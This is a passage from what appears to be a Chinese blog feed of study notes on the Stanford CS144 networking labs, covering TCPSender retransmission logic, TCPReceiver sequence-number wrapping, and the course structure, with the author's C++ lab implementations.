<p>如果重传计时器超时，则需要进行以下几步（稍微有点麻烦）</p>
<ul>
<li>
<p>重传尚未被 TCP 接收方完全确认的最早报文（即最低 ackno所对应的报文）。这一步需要我们将<strong>发送中的报文数据</strong>保存至一个新的数据结构中，这样才可以追踪正处于发送状态的数据。</p>
</li>
<li>
<p>如果接收者的 window size 不为 0，即可以正常接收数据，则</p>
<ul>
<li>跟踪<strong>连续重传次数</strong>。过多的重传次数可能意味着网络的中断，需要立即停止重传。</li>
<li>将RTO的值设置为先前的两倍，以降低较差网络环境的重传速度，以避免加深网络环境的拥堵。</li>
<li>重置并重启重传计时器。</li>
</ul>
<blockquote>
<p><strong>接收者 window size 为 0 的情况</strong>将在下面说明。</p>
</blockquote>
</li>
</ul>
</li>
<li>
<p>当接收者给发送者一个确认成功接收新数据的 ack 包时（absolute ack seqno 比之前接收到的 ackno 更大）：</p>
<ul>
<li>将 RTO 设置回初始值</li>
<li>如果发送方存在尚未完成的数据，则重新启动重传定时器</li>
<li>将<strong>连续重传计数</strong>清零。</li>
</ul>
</li>
</ul>
<h3 id="3-TCPSender-要求">3. TCPSender 要求</h3>
<p>在该实验中，我们需要完成 TCPSender 的以下四个接口：</p>
<ul>
<li>
<p><strong>fill_window</strong>：TCPSender 从 ByteStream 中读取数据，并以 TCPSegement 的形式发送，尽可能地填充接收者的<strong>窗口</strong>。但每个TCP段的大小不得超过 <code>TCPConfig::MAX PAYLOAD SIZE</code>。</p>
<blockquote>
<p>若接收方的 Windows size 为 0，则发送方将按照接收方 window size 为 1 的情况进行处理，持续发包。</p>
<p>因为虽然此时发送方发送的数据包可能会被接收方拒绝，但接收方可以在反向发送 ack 包时，将自己最新的 window size 返回给发送者。否则若双方停止了通信，那么当接收方的 window size 变大后，发送方仍然无法得知接收方可接受的字节数量。</p>
<p>若远程没有 ack 这个在 window size 为 0 的情况下发送的一字节数据包，那么发送者重传时<strong>不要将 RTO 乘2</strong>。这是因为将 RTO 双倍的目的是为了避免网络拥堵，但此时的数据包丢弃并不是因为网络拥堵的问题，而是远程放不下了。</p>
</blockquote>
</li>
<li>
<p><strong>ack_received</strong>：对接收方返回的 ackno 和 window size 进行处理。丢弃那些<strong>已经完全确认但仍然处于追踪队列</strong>的数据包。同时如果 window size 仍然存在空闲，则继续发包。</p>
</li>
<li>
<p><strong>tick</strong>：该函数将会被调用以指示经过的时间长度。发送方可能需要重新发送一些超时且没有被确认的数据包。</p>
</li>
<li>
<p><strong>send_empty_segment</strong>：生成并发送一个<strong>在 seq 空间中长度为 0</strong> 并<strong>正确设置 seqno</strong> 的 TCPSegment，这可让用户发送一个空的 ACK 段。</p>
</li>
</ul>
<h3 id="4-TCPSender-状态转换图">4. TCPSender 状态转换图</h3>
<p>我们无需定义新的状态变量，只需合理利用好各个公共接口的状态，即可快速确认当前的状态。</p>
<p><img src="/2021/11/cs144-lab3/image-20211109080457029.png" alt="image-20211109080457029"></p>
<h2 id="四、TCPSender-实现">四、TCPSender 实现</h2>
<p>实现起来有几个坑点：</p>
<ul>
<li>
<p>当 SYN 设置后，payload 应该在尽可能装的基础之上，少装入 1byte，因为这个 byte 大小被 SYN 占用。</p>
<p>而在 payload 尽可能装的基础上，若 FIN 装不下了，则必须在下一个包中装入 FIN 。</p>
</li>
<li>
<p>FIN 包的发送必须满足三个条件：</p>
<ul>
<li><strong>从来没发送过 FIN</strong>。这是为了防止发送方在发送 FIN 包并接收到 FIN ack 包之后，循环用 FIN 包填充发送窗口的情况。</li>
<li>输入字节流处于 EOF</li>
<li>window 减去 payload 大小后，仍然可以存放下 FIN</li>
</ul>
</li>
<li>
<p>当循环填充发送窗口时，若发送窗口大小足够但本地没有数据包需要发送，则必须停止发送。</p>
<p>若当前 Segment 是 FIN 包，则在发送完该包后，立即停止填充发送窗口。</p>
</li>
<li>
<p>重传定时器追踪的是发送者<strong>距离上次接收到新 ack 包</strong>的时间，而不是每个处于发送中的包的超时时间。因此除 SYN 包以外（它会启动定时器），其他发包操作将不会重置 重传定时器，同时也无需为每个数据包配备一个定时器。</p>
<p>同时，只有<strong>存在新数据包被接收方确认</strong>后，才会重置定时器。</p>
<p>tick 函数也是类似，只有存在处于发送状态的数据包时，重传定时器才起作用。若重传定时器超时，则重传的是第一个 <strong>seqno 最小且尚未重传</strong>的数据包。</p>
</li>
<li>
<p>当接收方的 window size 为 0 时，仍旧按照 window size 为 1 时去处理，发送一字节数据。但是，若远程没有发送 ack 包的时候，<strong>不要将 RTO 双倍</strong>，还是重置为之前的 RTO。</p>
</li>
</ul>
<p>以下是我的实现：</p>
<p>类声明：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TCPSender</span> &#123;</span></span><br><span class="line">  <span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> _timeout&#123;<span class="number">-1</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> _timecount&#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">map</span>&lt;<span class="keyword">size_t</span>, TCPSegment&gt; _outgoing_map&#123;&#125;;</span><br><span class="line">    <span class="keyword">size_t</span> _outgoing_bytes&#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> _last_window_size&#123;<span class="number">1</span>&#125;;</span><br><span class="line">    <span class="keyword">bool</span> _set_syn_flag&#123;<span class="literal">false</span>&#125;;</span><br><span class="line">    <span class="keyword">bool</span> _set_fin_flag&#123;<span class="literal">false</span>&#125;;</span><br><span class="line">    <span class="keyword">size_t</span> _consecutive_retransmissions_count&#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//! our initial sequence number, the number for our SYN.</span></span><br><span class="line">    WrappingInt32 _isn;</span><br><span class="line"></span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>类方法实现：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">TCPSender::bytes_in_flight</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> _outgoing_bytes; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TCPSender::fill_window</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 如果远程窗口大小为 0, 则把其视为 1 进行操作</span></span><br><span class="line">    <span class="keyword">size_t</span> curr_window_size = _last_window_size ? _last_window_size : <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 循环填充窗口</span></span><br><span class="line">    <span class="keyword">while</span> (curr_window_size &gt; _outgoing_bytes) &#123;</span><br><span class="line">        <span class="comment">// 尝试构造单个数据包</span></span><br><span class="line">        <span class="comment">// 如果此时尚未发送 SYN 数据包，则立即发送</span></span><br><span class="line">        TCPSegment segment;</span><br><span class="line">        <span class="keyword">if</span> (!_set_syn_flag) &#123;</span><br><span class="line">            segment.header().syn = <span class="literal">true</span>;</span><br><span class="line">            _set_syn_flag = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 设置 seqno</span></span><br><span class="line">        segment.header().seqno = next_seqno();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 装入 payload.</span></span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">size_t</span> payload_size =</span><br><span class="line">            min(TCPConfig::MAX_PAYLOAD_SIZE, curr_window_size - _outgoing_bytes - segment.header().syn);</span><br><span class="line">        <span class="built_in">string</span> payload = _stream.read(payload_size);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 读取好后，如果满足以下条件，则增加 FIN</span></span><br><span class="line"><span class="comment">         *  1. 从来没发送过 FIN</span></span><br><span class="line"><span class="comment">         *  2. 输入字节流处于 EOF</span></span><br><span class="line"><span class="comment">         *  3. window 减去 payload 大小后，仍然可以存放下 FIN</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (!_set_fin_flag &amp;&amp; _stream.eof() &amp;&amp; payload.size() + _outgoing_bytes &lt; curr_window_size)</span><br><span class="line">            _set_fin_flag = segment.header().fin = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        segment.payload() = Buffer(move(payload));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果没有任何数据，则停止数据包的发送</span></span><br><span class="line">        <span class="keyword">if</span> (segment.length_in_sequence_space() == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果没有正在等待的数据包，则重设更新时间</span></span><br><span class="line">        <span class="keyword">if</span> (_outgoing_map.empty()) &#123;</span><br><span class="line">            _timeout = _initial_retransmission_timeout;</span><br><span class="line">            _timecount = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 发送</span></span><br><span class="line">        _segments_out.push(segment);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 追踪这些数据包</span></span><br><span class="line">        _outgoing_bytes += segment.length_in_sequence_space();</span><br><span class="line">        _outgoing_map.insert(make_pair(_next_seqno, segment));</span><br><span class="line">        <span class="comment">// 更新待发送 abs seqno</span></span><br><span class="line">        _next_seqno += segment.length_in_sequence_space();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果设置了 fin，则直接退出填充 window 的操作</span></span><br><span class="line">        <span class="keyword">if</span> (segment.header().fin)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//! \param ackno The remote receiver's ackno (acknowledgment number)</span></span><br><span class="line"><span class="comment">//! \param window_size The remote receiver's advertised window size</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TCPSender::ack_received</span><span class="params">(<span class="keyword">const</span> WrappingInt32 ackno, <span class="keyword">const</span> <span class="keyword">uint16_t</span> window_size)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> abs_seqno = unwrap(ackno, _isn, _next_seqno);</span><br><span class="line">    <span class="comment">// 如果传入的 ack 是不可靠的，则直接丢弃</span></span><br><span class="line">    <span class="keyword">if</span> (abs_seqno &gt; _next_seqno)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="comment">// 遍历数据结构，将已经接收到的数据包丢弃</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> iter = _outgoing_map.begin(); iter != _outgoing_map.end();) &#123;</span><br><span class="line">        <span class="comment">// 如果一个发送的数据包已经被成功接收</span></span><br><span class="line">        <span class="keyword">const</span> TCPSegment &amp;seg = iter-&gt;second;</span><br><span class="line">        <span class="keyword">if</span> (iter-&gt;first + seg.length_in_sequence_space() &lt;= abs_seqno) &#123;</span><br><span class="line">            _outgoing_bytes -= seg.length_in_sequence_space();</span><br><span class="line">            iter = _outgoing_map.erase(iter);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 如果有新的数据包被成功接收，则清空超时时间</span></span><br><span class="line">            _timeout = _initial_retransmission_timeout;</span><br><span class="line">            _timecount = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果当前遍历到的数据包还没被接收，则说明后面的数据包均未被接收，因此直接返回</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    _consecutive_retransmissions_count = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 填充后面的数据</span></span><br><span class="line">    _last_window_size = window_size;</span><br><span class="line">    fill_window();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//! \param[in] ms_since_last_tick the number of milliseconds since the last call to this method</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TCPSender::tick</span><span class="params">(<span class="keyword">const</span> <span class="keyword">size_t</span> ms_since_last_tick)</span> </span>&#123;</span><br><span class="line">    _timecount += ms_since_last_tick;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">auto</span> iter = _outgoing_map.begin();</span><br><span class="line">    <span class="comment">// 如果存在发送中的数据包，并且定时器超时</span></span><br><span class="line">    <span class="keyword">if</span> (iter != _outgoing_map.end() &amp;&amp; _timecount &gt;= _timeout) &#123;</span><br><span class="line">        <span class="comment">// 如果窗口大小不为0还超时，则说明网络拥堵</span></span><br><span class="line">        <span class="keyword">if</span> (_last_window_size &gt; <span class="number">0</span>)</span><br><span class="line">            _timeout *= <span class="number">2</span>;</span><br><span class="line">        _timecount = <span class="number">0</span>;</span><br><span class="line">        _segments_out.push(iter-&gt;second);</span><br><span class="line">        <span class="comment">// 连续重传计时器增加</span></span><br><span class="line">        ++_consecutive_retransmissions_count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">TCPSender::consecutive_retransmissions</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> _consecutive_retransmissions_count; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TCPSender::send_empty_segment</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    TCPSegment segment;</span><br><span class="line">    segment.header().seqno = next_seqno();</span><br><span class="line">    _segments_out.push(segment);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>计算机网络</tag>
        <tag>CS144</tag>
      </tags>
  </entry>
  <entry>
    <title>CS144计算机网络 Lab2</title>
    <url>/2021/11/cs144-lab2/</url>
    <content><![CDATA[<h2 id="一、简介">一、简介</h2>
<p>这里记录了笔者学习 CS144 计算机网络 Lab2 的一些笔记 - TCP接收方实现 TCPReceiver</p>
<p>CS144 Lab2 实验指导书 - <a href="https://cs144.github.io/assignments/lab2.pdf" target="_blank" rel="noopener">Lab Checkpoint 2: the TCP receiver</a></p>
<p>个人 CS144 实验项目地址 - <a href="https://github.com/Kiprey/sponge" target="_blank" rel="noopener">github</a></p>
<a id="more"></a>
<h2 id="二、环境配置">二、环境配置</h2>
<p>当前我们的实验代码位于 <code>master</code> 分支，而在完成 Lab 之前需要合并一些依赖代码，因此执行以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git merge origin/lab2-startercode</span><br></pre></td></tr></table></figure>
<p>之后重新 make 编译即可。</p>
<h2 id="三、TCPReceiver-简述">三、TCPReceiver 简述</h2>
<p>在 Lab2，我们将实现一个 TCPReceiver，用以接收传入的 TCP segment 并将其转换成用户可读的数据流。</p>
<p>TCPReceiver 除了将读入的数据写入至 ByteStream 中以外，它还需要<strong>告诉发送者两个属性</strong>：</p>
<ul>
<li>第一个未组装的字节索引，称为<strong>确认号ackno</strong>，它是接收者需要的第一个字节的索引。</li>
<li><strong>第一个未组装的字节索引</strong>和<strong>第一个不可接受的字节索引</strong>之间的距离，称为 <strong>窗口长度window size</strong>。</li>
</ul>
<p>ackno 和 window size 共同描述了接收者当前的<strong>接收窗口</strong>。接收窗口是 发送者允许发送数据的一个范围，通常 TCP 接收方使用接收窗口来进行<strong>流量控制</strong>，限制发送方发送数据。</p>
<p>总的来说，我们将要实现的 TCPReceiver 需要做以下几件事情：</p>
<ul>
<li>接收TCP segment</li>
<li>重新组装字节流（包括EOF）</li>
<li>确定应该发回给发送者的信号，以进行数据确认和流量控制</li>
</ul>
<h2 id="四、索引转换">四、索引转换</h2>
<p>TCP 报文中用来描述**当前数据首字节的索引（序列号 seqno）**是32位类型的，这意味着在处理上增加了一些需要考虑的东西：</p>
<ul>
<li>
<p>由于 32位类型最大能表达的值是 4GB，存在上溢的可能。因此当 32位的 seqno 上溢后，下一个字节的 seqno 就重新从 0 开始。</p>
</li>
<li>
<p>处于安全性考虑，以及避免与之前的 TCP 报文混淆，TCP 需要让每个 seqno 都不可被猜测到，并且降低重复的可能性。因此 TCP seqno 不会从 0 开始，而是从一个 32 位随机数起步（称为<strong>初始序列号 ISN</strong>）。</p>
<p>而 ISN 是表示 SYN 包（用以表示TCP 流的开始）的序列号。</p>
</li>
<li>
<p>TCP 流的<strong>逻辑开始数据包</strong>和<strong>逻辑结束数据包</strong>各占用一个 seqno。除了确保<strong>接收到所有字节的数据</strong>以外，TCP 还需要确保接收到<strong>流的开头和结尾</strong>。 因此，在 TCP 中，SYN（流开始）和 FIN（流结束）控制标志将会被分别分配一个序列号（SYN标志占用的序列号就是ISN）。</p>
<p>流中的每个数据字节也占用一个序列号。</p>
<p>但需要注意的是，SYN 和 FIN 不是流本身的一部分，也不是传输的字节数据。它们只是代表字节流本身的开始和结束。</p>
</li>
</ul>
<p>字节索引类型一多就容易乱。当前总共有三种索引：</p>
<ul>
<li>序列号 seqno。<strong>从 ISN 起步</strong>，包含 SYN 和 FIN，<strong>32 位循环</strong>计数</li>
<li>绝对序列号 absolute seqno。<strong>从 0 起步</strong>，包含 SYN 和 FIN，<strong>64 位非循环</strong>计数</li>
<li>流索引 stream index。<strong>从 0 起步</strong>，<strong>排除 SYN 和 FIN</strong>，<strong>64 位非循环</strong>计数。</li>
</ul>
<p>这是一个简单浅显的例子，用于区分开三种索引的区别：</p>
<p><img src="/2021/11/cs144-lab2/image-20211107105751818.png" alt="image-20211107105751818"></p>
<p>序列号和<strong>绝对</strong>序列号之间相互转换稍微有点麻烦，因为序列号是<strong>循环计数</strong>的。在该实验中，CS144 使用自定义类型 WrappingInt32 表示序列号，并编写了它与绝对序列号之间的转换。</p>
<blockquote>
<p>但这个需要我们自己实现，天下没有免费的午餐（笑）</p>
</blockquote>
<p>这个实现稍微有点麻烦，而且实现的时候也最好避免各类循环，减少使用条件判断的次数，以提高执行效率。</p>
<p>我的实现如下所示，相关细节以注释形式写入至代码中：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//! Transform an "absolute" 64-bit sequence number (zero-indexed) into a WrappingInt32</span></span><br><span class="line"><span class="comment">//! \param n The input absolute 64-bit sequence number</span></span><br><span class="line"><span class="comment">//! \param isn The initial sequence number</span></span><br><span class="line"><span class="function">WrappingInt32 <span class="title">wrap</span><span class="params">(<span class="keyword">uint64_t</span> n, WrappingInt32 isn)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> WrappingInt32&#123;isn + <span class="keyword">static_cast</span>&lt;<span class="keyword">uint32_t</span>&gt;(n)&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//! Transform a WrappingInt32 into an "absolute" 64-bit sequence number (zero-indexed)</span></span><br><span class="line"><span class="comment">//! \param n The relative sequence number</span></span><br><span class="line"><span class="comment">//! \param isn The initial sequence number</span></span><br><span class="line"><span class="comment">//! \param checkpoint A recent absolute 64-bit sequence number</span></span><br><span class="line"><span class="comment">//! \returns the 64-bit sequence number that wraps to `n` and is closest to `checkpoint`</span></span><br><span class="line"><span class="comment">//!</span></span><br><span class="line"><span class="comment">//! \note Each of the two streams of the TCP connection has its own ISN. One stream</span></span><br><span class="line"><span class="comment">//! runs from the local TCPSender to the remote TCPReceiver and has one ISN,</span></span><br><span class="line"><span class="comment">//! and the other stream runs from the remote TCPSender to the local TCPReceiver and</span></span><br><span class="line"><span class="comment">//! has a different ISN.</span></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">unwrap</span><span class="params">(WrappingInt32 n, WrappingInt32 isn, <span class="keyword">uint64_t</span> checkpoint)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 32位的范围</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">constexpr</span> <span class="keyword">uint64_t</span> INT32_RANGE = <span class="number">1l</span> &lt;&lt; <span class="number">32</span>;</span><br><span class="line">    <span class="comment">// 获取 n 与 isn 之间的偏移量（mod）</span></span><br><span class="line">    <span class="comment">// 实际的 absolute seqno % INT32_RANGE == offset</span></span><br><span class="line">    <span class="keyword">uint32_t</span> offset = n - isn;</span><br><span class="line">    <span class="comment">/// <span class="doctag">NOTE:</span> 最大的坑点！如果 checkpoint 比 offset 大，那么就需要进行四舍五入</span></span><br><span class="line">    <span class="comment">/// <span class="doctag">NOTE:</span> 但是!!! 如果 checkpoint 比 offset 还小，那就只能向上入了，即此时的 offset 就是 abs seqno</span></span><br><span class="line">    <span class="keyword">if</span>(checkpoint &gt; offset) &#123;</span><br><span class="line">        <span class="comment">// 加上半个 INT32_RANGE 是为了四舍五入</span></span><br><span class="line">        <span class="keyword">uint64_t</span> real_checkpoint = (checkpoint - offset) + (INT32_RANGE &gt;&gt; <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">uint64_t</span> wrap_num = real_checkpoint / INT32_RANGE;</span><br><span class="line">        <span class="keyword">return</span> wrap_num * INT32_RANGE + offset;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">       <span class="keyword">return</span> offset;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="四、TCPReceiver-实现">四、TCPReceiver 实现</h2>
<h3 id="1-要求">1. 要求</h3>
<p>需要实现一些类成员函数</p>
<ul>
<li>
<p><code>segment_received()</code>: 该函数将会在每次获取到 TCP 报文时被调用。该函数需要完成：</p>
<ul>
<li>
<p>如果接收到了 SYN 包，则设置 ISN 编号。</p>
<p>注意：SYN 和 FIN 包<strong>仍然可以携带用户数据并一同传输</strong>。同时，<strong>同一个数据包下既可以设置 SYN 标志也可以设置 FIN 标志</strong>。</p>
</li>
<li>
<p>将获取到的数据传入流重组器，并在接收到 FIN 包时终止数据传输。</p>
</li>
</ul>
</li>
<li>
<p><code>ackno()</code>：返回接收方<strong>尚未获取到的第一个字节的字节索引</strong>。如果 ISN 暂未被设置，则返回空。</p>
</li>
<li>
<p><code>window_size()</code>：返回接收窗口的大小，即<strong>第一个未组装的字节索引</strong>和<strong>第一个不可接受的字节索引</strong>之间的长度。</p>
</li>
</ul>
<p>这是 CS144 对 TCP receiver 的期望执行流程：</p>
<p><img src="/2021/11/cs144-lab2/image-20211107122822566.png" alt="image-20211107122822566"></p>
<h3 id="2-具体实现">2. 具体实现</h3>
<h4 id="思路">思路</h4>
<p>对于 TCPReceiver 来说，除了错误状态以外，它一共有3种状态，分别是：</p>
<ul>
<li>LISTEN：等待 SYN 包的到来。若在 SYN 包到来前就有其他数据到来，则<strong>必须丢弃</strong>。</li>
<li>SYN_RECV：获取到了 SYN 包，此时可以正常的接收数据包</li>
<li>FIN_RECV：获取到了 FIN 包，此时务必终止 ByteStream 数据流的输入。</li>
</ul>
<p>在每次 TCPReceiver 接收到数据包时，我们该如何知道当前接收者处于什么状态呢？可以通过以下方式快速判断：</p>
<ul>
<li>当 isn 还没设置时，肯定是 LISTEN 状态</li>
<li>当 ByteStream.input_ended()，则肯定是 FIN_RECV 状态</li>
<li>其他情况下，是 SYN_RECV 状态</li>
</ul>
<p>Window Size 是当前的 capacity 减去 ByteStream 中尚未被读取的数据大小，即 reassembler 可以存储的尚未装配的子串索引范围。</p>
<p>ackno 的计算必须考虑到 SYN 和 FIN 标志，因为这两个标志各占一个 seqno。故在返回 ackno 时，务必判断当前 接收者处于什么状态，然后依据当前状态来判断是否需要对当前的计算结果加1或加2。而这条准则对 push_substring 时同样适用。</p>
<h4 id="源码实现">源码实现</h4>
<p>类声明：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TCPReceiver</span> &#123;</span></span><br><span class="line">    WrappingInt32 _isn;</span><br><span class="line">    <span class="keyword">bool</span> _set_syn_flag;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//! Our data structure for re-assembling bytes.</span></span><br><span class="line">    StreamReassembler _reassembler;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//! The maximum number of bytes we'll store.</span></span><br><span class="line">    <span class="keyword">size_t</span> _capacity;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>方法实现：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  \brief 当前 TCPReceiver 大体上有三种状态， 分别是</span></span><br><span class="line"><span class="comment"> *      1. LISTEN，此时 SYN 包尚未抵达。可以通过 _set_syn_flag 标志位来判断是否在当前状态</span></span><br><span class="line"><span class="comment"> *      2. SYN_RECV, 此时 SYN 抵达。只能判断当前不在 1、3状态时才能确定在当前状态</span></span><br><span class="line"><span class="comment"> *      3. FIN_RECV, 此时 FIN 抵达。可以通过 ByteStream end_input 来判断是否在当前状态</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TCPReceiver::segment_received</span><span class="params">(<span class="keyword">const</span> TCPSegment &amp;seg)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 判断是否是 SYN 包</span></span><br><span class="line">    <span class="keyword">const</span> TCPHeader &amp;header = seg.header();</span><br><span class="line">    <span class="keyword">if</span> (!_set_syn_flag) &#123;</span><br><span class="line">        <span class="comment">// 注意 SYN 包之前的数据包必须全部丢弃</span></span><br><span class="line">        <span class="keyword">if</span> (!header.syn)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        _isn = header.seqno;</span><br><span class="line">        _set_syn_flag = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">uint64_t</span> abs_ackno = _reassembler.stream_out().bytes_written() + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> curr_abs_seqno = unwrap(header.seqno, _isn, abs_ackno);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//! <span class="doctag">NOTE:</span> SYN 包中的 payload 不能被丢弃</span></span><br><span class="line">    <span class="comment">//! <span class="doctag">NOTE:</span> reassember 足够鲁棒以至于无需进行任何 seqno 过滤操作</span></span><br><span class="line">    <span class="keyword">uint64_t</span> stream_index = curr_abs_seqno - <span class="number">1</span> + (header.syn);</span><br><span class="line">    _reassembler.push_substring(seg.payload().copy(), stream_index, header.fin);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">optional&lt;WrappingInt32&gt; <span class="title">TCPReceiver::ackno</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 判断是否是在 LISTEN 状态</span></span><br><span class="line">    <span class="keyword">if</span> (!_set_syn_flag)</span><br><span class="line">        <span class="keyword">return</span> nullopt;</span><br><span class="line">    <span class="comment">// 如果不在 LISTEN 状态，则 ackno 还需要加上一个 SYN 标志的长度</span></span><br><span class="line">    <span class="keyword">uint64_t</span> abs_ack_no = _reassembler.stream_out().bytes_written() + <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 如果当前处于 FIN_RECV 状态，则还需要加上 FIN 标志长度</span></span><br><span class="line">    <span class="keyword">if</span> (_reassembler.stream_out().input_ended())</span><br><span class="line">        ++abs_ack_no;</span><br><span class="line">    <span class="keyword">return</span> WrappingInt32(_isn) + abs_ack_no;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">TCPReceiver::window_size</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> _capacity - _reassembler.stream_out().buffer_size(); &#125;</span><br></pre></td></tr></table></figure>
<p>测试结果就不贴了，不同的机器上跑所消耗的时间是不一样的，没什么可比性。</p>
]]></content>
      <tags>
        <tag>计算机网络</tag>
        <tag>CS144</tag>
      </tags>
  </entry>
  <entry>
    <title>CS144计算机网络 Lab1</title>
    <url>/2021/11/cs144-lab1/</url>
    <content><![CDATA[<h2 id="一、简介">一、简介</h2>
<p>这里记录了笔者学习 CS144 计算机网络 Lab1 的一些笔记 - 流重组器 StreamReassembler</p>
<p>CS144 Lab1 实验指导书 - <a href="https://cs144.github.io/assignments/lab1.pdf" target="_blank" rel="noopener">Lab Checkpoint 1: stitching substrings into a byte stream</a></p>
<p>个人 CS144 实验项目地址 - <a href="https://github.com/Kiprey/sponge" target="_blank" rel="noopener">github</a></p>
<p>PS: 在做 CS144 前，最好先学一手计网理论，或者读读我之前写的<a href="https://kiprey.github.io/2021/05/cnatda-1/#4-%E9%9D%A2%E5%90%91%E8%BF%9E%E6%8E%A5%E7%9A%84%E8%BF%90%E8%BE%93%EF%BC%9ATCP">笔记</a></p>
<a id="more"></a>
<h2 id="二、实验结构">二、实验结构</h2>
<p>这幅图完整的说明了CS144 这门实验的结构：</p>
<p><img src="/2021/11/cs144-lab1/image-20211105142904316.png" alt="image-20211105142904316"></p>
<p>其中， <code>ByteStream</code> 是我们已经在 Lab0 中实现完成的。</p>
<p>我们将在接下来的实验中分别实现：</p>
<ul>
<li>Lab1 <code>StreamReassembler</code>：实现一个流重组器，一个将字节流的字串或者小段按照正确顺序来拼接回连续字节流的模块</li>
<li>Lab2 <code>TCPReceiver</code>：实现入站字节流的TCP部分。</li>
<li>Lab3 <code>TCPSender</code>：实现出站字节流的TCP部分。</li>
<li>Lab4 <code>TCPConnection</code>:   结合之前的工作来创建一个有效的 TCP 实现。最后我们可以使用这个 TCP 实现来和真实世界的服务器进行通信。</li>
</ul>
<blockquote>
<p>该实验引导我们以模块化的方式构建一个 TCP 实现。</p>
</blockquote>
